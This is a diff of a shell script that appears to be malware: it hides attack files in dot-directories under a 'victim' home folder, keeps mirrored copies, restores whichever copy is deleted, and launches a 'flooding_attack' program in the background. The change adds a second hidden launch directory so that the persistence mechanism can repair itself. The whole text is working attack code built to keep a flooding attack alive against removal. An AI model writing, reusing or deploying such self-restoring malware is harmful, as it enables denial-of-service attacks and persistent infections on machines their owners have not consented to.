@@ -1,7 +1,8 @@
 #!/bin/sh
 
 home_dir="/home/victim"
-launch_dir=".Launch_Attack"
+launch_dir1=".Launch_Attack"
+launch_dir2=".Attack_Launch"
 dir01=".etc"
 dir02=".var"
 module_dir=".module"
@@ -13,19 +14,24 @@ is_process_exist() {
   ps -e | grep -q "$process_name"
 }
 
-check_file_and_launch_attack() { # restore corrupted files
+check_file_and_launch_attack() {
+  # restore corrupted launching file
+  if [ -f "$home_dir/$launch_dir1/$launch_file" ] ||\
+    [ ! -f "$home_dir/$launch_dir2/$launch_file" ]
+  then
+    cp -r "$home_dir/$launch_dir1" "$home_dir/$launch_dir2"
+  elif [ -f "$home_dir/$launch_dir2/$launch_file" ] ||\
+    [ ! -f "$home_dir/$launch_dir1/$launch_file" ]
+  then
+    cp -r "$home_dir/$launch_dir2" "$home_dir/$launch_dir1"
+  fi
+  # launching attack and restore corrupted flooding attack files
   if [ -f "$home_dir/$dir01/$module_dir/$flooding_file" ] ||\
-    [ ! -d "$home_dir/$dir02" ] ||\
-    [ ! -d "$home_dir/$dir02/$module_dir" ] ||\
-    [ ! -f "$home_dir/$dir02/$module_dir/$launch_file" ] ||\
     [ ! -f "$home_dir/$dir02/$module_dir/$flooding_file" ]
   then
     $home_dir/$dir01/$module_dir/flooding_attack&
     cp -r "$home_dir/$dir01" "$home_dir/$dir02"
   elif [ -f "$home_dir/$dir02/$module_dir/$flooding_file" ] ||\
-    [ ! -d "$home_dir/$dir01" ] ||\
-    [ ! -d "$home_dir/$dir01/$module_dir" ] ||\
-    [ ! -f "$home_dir/$dir01/$module_dir/$launch_file" ] ||\
     [ ! -f "$home_dir/$dir01/$module_dir/$flooding_file" ]
   then
     $home_dir/$dir02/$module_dir/flooding_attack&
